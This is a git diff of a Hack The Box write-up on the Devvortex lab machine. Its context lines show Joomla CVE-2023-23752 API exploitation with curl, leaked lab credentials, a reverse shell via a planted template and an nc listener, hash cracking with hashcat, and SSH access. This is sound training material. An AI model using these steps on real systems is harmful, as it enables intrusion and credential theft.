@@ -23,7 +23,7 @@ difficulty: Easy
 A full TCP scan showed that there are only two ports open: 22 and 80. The web server is running nginx 1.18.0 on Ubuntu and the ssh server is running OpenSSH 8.2p1.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Devvortex]
 └──╼ $ sudo nmap -sC -sV -p- -T4 --min-rate 1000 -O --reason  10.129.229.146 -oN nmap/tcp_scan.nmap 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-31 09:15 CET
 Nmap scan report for 10.129.229.146
@@ -52,14 +52,14 @@ Nmap done: 1 IP address (1 host up) scanned in 87.51 seconds
 since we got redirection to `http://devvortex.htb/` we need to add it to our `/etc/hosts` file.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Devvortex]
 └──╼ $ echo "10.129.229.146 devvortex.htb " >> /etc/hosts
 ```
 
 Before visiting the website, I ran a quick vhost scan using ffuf 
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Devvortex]
 └──╼ $ffuf -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 154 
 
         /'___\  /'___\           /'___\       
@@ -111,7 +111,7 @@ After some research, I discovered it was a Joomla 404 page, which Wappalyzer con
 An important discovery: Joomla websites expose their version information at the `/administrator/manifests/files/joomla.xml` endpoint.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Devvortex]
 └──╼ $curl http://dev.devvortex.htb/administrator/manifests/files/joomla.xml | grep version
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -120,7 +120,7 @@ An important discovery: Joomla websites expose their version information at the 
 	<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
 	<version>4.2.6</version>
 ```
-### About CVE-2023-23752
+### CVE-2023-23752
 
 The Joomla version is 4.2.6, which is vulnerable to several CVEs: **CVE-2023-23750**, **CVE-2023-23751**, and **CVE-2023-23752**. The most critical one is **CVE-2023-23752**.
 
@@ -129,12 +129,14 @@ The Joomla version is 4.2.6, which is vulnerable to several CVEs: **CVE-2023-237
 
 For a more detailed analysis, see this [article](https://www.sentinelone.com/vulnerability-database/cve-2023-23752/).
 
-## CVE-2023-23752 Exploitation
+## Exploitation
+
+### CVE-2023-23752
 
 Using this vulnerability, we can access sensitive API endpoints without authentication. For example, we can list users by visiting the `/api/index.php/v1/users?public=true` endpoint. 
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Devvortex]
 └──╼ $curl http://dev.devvortex.htb/api/index.php/v1/users?public=true | jq
 {
   "links": {
@@ -187,7 +189,7 @@ Using this vulnerability, we can access sensitive API endpoints without authenti
 We can also retrieve the application configuration by visiting the `/api/index.php/v1/config/application?public=true` endpoint. 
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Devvortex]
 └──╼ $curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true | jq
 {
   "links": {
@@ -363,7 +365,7 @@ We can also retrieve the application configuration by visiting the `/api/index.p
 }
 ```
 
-## Shell as www-data
+### Shell as `www-data`
 
 As we can see, we obtained the CMS password **P4ntherg0t1n5r3c0n##**. I then navigated to `http://dev.devvortex.htb/administrator` and logged in with the username **lewis** and this password. 
 
@@ -371,7 +373,7 @@ As we can see, we obtained the CMS password **P4ntherg0t1n5r3c0n##**. I then nav
 
 Now we can upload a PHP reverse shell to one of the templates. Navigate to **System > Global Configuration > Templates > Site Templates**, click on the template name, and select `error.php` (since `index.php` is read-only). Then I triggered an error on `http://dev.devvortex.htb` by visiting a non-existent page to obtain the shell.
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Devvortex]
 └──╼ $nc -lnvp 9001
 Listening on 0.0.0.0 9001
 Connection received on 10.129.229.146 60406
@@ -400,7 +402,9 @@ tcp                LISTEN              0                   511                  
 
 MySQL was listening on localhost, so I used the same credentials `lewis:P4ntherg0t1n5r3c0n##` to log in. 
 
-## Shell as logan
+## Lateral Movement
+
+### Shell as `logan`
 
 Using the database credentials, I extracted the user hashes and cracked Logan's password.
 
@@ -466,7 +470,7 @@ mysql>
 I then cracked Logan's password using hashcat:
 
 ```bash
-┌─[✗]─[tr3m0x@parrot]─[~]
+┌─[✗]─[tr3m0x@parrot]─[~/htb/linux/Devvortex]
 └──╼ $hashcat -m 3200 logan.hash /usr/share/wordlists/rockyou.txt 
 hashcat (v6.2.6) starting
 
@@ -538,7 +542,7 @@ Stopped: Mon Aug 31 10:41:29 2026
 
 Using the credentials `logan:tequieromucho`, I SSH'd into the machine:
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Devvortex]
 └──╼ $ssh logan@devvortex.htb 
 logan@devvortex.htb's password: 
 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)
